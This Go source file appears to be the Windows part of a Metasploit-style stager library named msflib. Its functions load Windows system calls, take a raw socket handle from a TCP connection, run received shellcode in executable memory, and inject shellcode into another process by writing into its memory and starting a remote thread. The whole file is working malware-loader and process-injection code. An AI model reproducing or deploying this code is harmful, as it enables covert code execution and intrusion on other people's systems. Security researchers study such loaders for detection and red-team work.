package msflib

import (
	"encoding/binary"
	"net"
	"reflect"
	"syscall"
	"unsafe"
)

var (
	kernel32             = syscall.MustLoadDLL("kernel32.dll")
	ntdll                = syscall.MustLoadDLL("ntdll.dll")
	virtualAlloc         = kernel32.MustFindProc("VirtualAlloc")
	virtualAllocEx       = kernel32.MustFindProc("VirtualAllocEx")
	rtlCopyMemory        = ntdll.MustFindProc("RtlCopyMemory")
	createThread         = kernel32.MustFindProc("CreateThread")
	openProcess          = kernel32.MustFindProc("OpenProcess")
	writeProcessMemory   = kernel32.MustFindProc("WriteProcessMemory")
	createRemoteThreadEx = kernel32.MustFindProc("CreateRemoteThreadEx")
	closeHandle          = kernel32.MustFindProc("CloseHandle")
)

func init() {
	// msf mode setings
	CHECKSUMMODE = 92
	PLATFORM = 1
}

// return a socket file descriptor as 4 bytes
func getFDBytes(conn *net.TCPConn) []byte {
	fd := reflect.ValueOf(*conn).FieldByName("fd")
	handle := reflect.Indirect(fd).FieldByName("pfd").FieldByName("Sysfd")
	socketFd := *(*uint32)(unsafe.Pointer(handle.UnsafeAddr()))

	buff := make([]byte, 4)
	binary.LittleEndian.PutUint32(buff, socketFd)
	return buff
}

func callPayload(payload []byte) error {
	addr, _, err := virtualAlloc.Call(0, uintptr(len(payload)), 0x1000|0x2000, 0x40)
	if addr == 0 {
		return err
	}
	_, _, err = rtlCopyMemory.Call(addr, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)))
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			return err
		}
	}
	handle, _, err := createThread.Call(0, 0, uintptr(addr), 0, 0, 0)
	if handle == 0 {
		return err
	}
	_, err = syscall.WaitForSingleObject(syscall.Handle(handle), uint32(0xffffffff))
	if err != nil {
		return err
	}
	return nil
}

func injectPayload(payload []byte, pid int) error {
	handle, _, err := openProcess.Call(
		// PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,
		0x0002|0x0400|0x0008|0x0020|0x0010,
		uintptr(0),
		uintptr(int(pid)),
	)
	if handle == 0 {
		return err
	}
	addr, _, err := virtualAllocEx.Call(
		handle, 0, uintptr(len(payload)),
		// MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
		0x1000|0x2000, 0x40,
	)
	if addr == 0 {
		return err
	}
	writeProcResult, _, err := writeProcessMemory.Call(handle, addr, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)), 0)
	if writeProcResult == 0 {
		return err
	}
	_, _, err = createRemoteThreadEx.Call(handle, 0, 0, addr, 0, 0, 0)
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			return err
		}
	}
	_, _, err = closeHandle.Call(handle)
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			return err
		}
	}
	return nil
}
